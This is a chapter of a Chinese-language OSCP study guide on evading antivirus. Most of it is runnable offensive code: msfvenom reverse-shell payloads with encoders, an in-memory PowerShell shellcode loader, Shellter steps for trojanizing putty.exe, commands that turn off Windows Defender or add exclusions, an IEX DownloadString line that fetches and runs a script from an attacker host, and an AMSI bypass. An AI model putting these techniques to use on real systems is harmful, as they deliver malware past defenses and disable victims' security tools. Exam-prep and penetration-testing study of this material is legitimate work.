# Ch 39 — AV 規避基礎：混淆、msfvenom payload 修改

> 目標：了解 Windows Defender / AV 的基本偵測機制，掌握讓 msfvenom payload 繞過 AV 的基礎技術。

## 為什麼 AV 規避不是 OSCP 重點

OSCP 考試的靶機通常**沒有啟用 AV**，或者 AV 設定成很弱。你不需要深入的 AV 規避技術就能通過考試。

但知道基礎：
- 避免 msfvenom 預設 payload 被 Defender 擋（某些靶機有）
- 理解為什麼 Metasploit 預設 payload 被各大 AV 認識

## 靜態分析 vs 動態分析

```
靜態分析：掃描檔案的特徵碼（Signature）
  → 比對已知惡意程式的 bytes 序列
  → 對策：改變 shellcode 的 bytes（加密、編碼）

動態分析：在沙箱裡執行，觀察行為
  → 看它做了什麼（網路連接、registry 修改）
  → 對策：延遲執行、檢測沙箱環境
```

OSCP 主要對付靜態分析。

## msfvenom 的編碼器

```bash
# 使用 x86/shikata_ga_nai 編碼
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
    -e x86/shikata_ga_nai -i 5 \   # 編碼 5 次
    -f exe -o shell_encoded.exe

# 多次編碼繞過簡單特徵偵測，但現代 AV 基本上認識 shikata_ga_nai
```

## 自定義 PowerShell Loader

繞過 Defender 更有效的方法是**不用 exe，改用 PowerShell 下載並在記憶體中執行**：

```powershell
# 在 Kali 生成 PowerShell 格式的 shellcode
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f ps1 -o shell.ps1

# 一個簡單的 shellcode loader（在記憶體中執行，不寫磁碟）
$shellcode = [System.Convert]::FromBase64String('<base64_shellcode>')
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $shellcode.Length)
$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [System.Action])
$delegate.Invoke()
```

## Veil 框架

Veil 生成各種 AV 規避的 payload：

```bash
# 安裝
sudo apt install veil

# 啟動
veil

# 選 evasion 模式
Veil> use evasion
# 選 payload（如 cs/meterpreter/rev_tcp.py）
# 設定 LHOST / LPORT
# 生成
```

## Shellter

Shellter 把 shellcode 注入合法的 PE binary：

```bash
# 安裝
sudo apt install shellter

# 用合法程式（如 putty.exe）作為載體
shellter

# 選 A（自動模式）
# 選一個 PE 檔（如 putty.exe）
# 注入 msfvenom 生成的 shellcode
```

注入後的 putty.exe 外觀正常，但執行時會連到你的 listener。

## 實用的考試技巧

### AV 把你的 exe 刪了怎麼辦

```powershell
# 停用 Windows Defender（需要管理員）
Set-MpPreference -DisableRealtimeMonitoring $true

# 或加排除路徑
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# 然後再放 payload 到 C:\Windows\Temp\
```

### 用 PowerShell 繞過（Fileless）

```powershell
# 直接下載並在記憶體執行（不寫磁碟，繞過某些掃描）
powershell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"
```

### AMSI Bypass（AmsiScanBuffer Patching）

AMSI 是 Windows 的 PowerShell 掃描介面。繞過它讓 PS shellcode 不被掃描：

```powershell
# 修改 AMSI 掃描函數（繞過 PowerShell 層面的掃描）
$a=[Ref].Assembly.GetTypes();
$b=$null;
foreach($c in $a){
    if($c.Name -like '*iutils'){$b=$c}
}
$d=$b.GetFields('NonPublic,Static');
foreach($e in $d){
    if($e.Name -like '*itFailed'){
        $e.SetValue($null,$true)
    }
}
```

**注意**：AMSI bypass 技術更新很快，考試環境不一定需要，知道概念就好。

## 本章重點摘要

```
考試最實用的 AV 規避：
1. 先試直接傳 payload，很多靶機沒有 AV
2. 如果被刪，嘗試停用 Defender（如果有管理員）
3. 改用 PowerShell 下載執行（IEX + DownloadString）
4. 加排除路徑，再重新執行
5. 如果還是不行，才考慮 Veil / Shellter
```

不要在 AV 規避上花太多時間——OSCP 考試很少需要深度 AV 規避。

## 自我檢核

- [ ] 知道靜態分析和動態分析的區別
- [ ] 能用 `-e x86/shikata_ga_nai` 編碼 msfvenom payload
- [ ] 知道 PowerShell IEX + DownloadString 是 Fileless 執行
- [ ] 知道 `Set-MpPreference -DisableRealtimeMonitoring $true` 停用 Defender

→ [Ch 40 OSCP 24 小時考試策略：時間分配與心態](./40-exam-strategy.md)
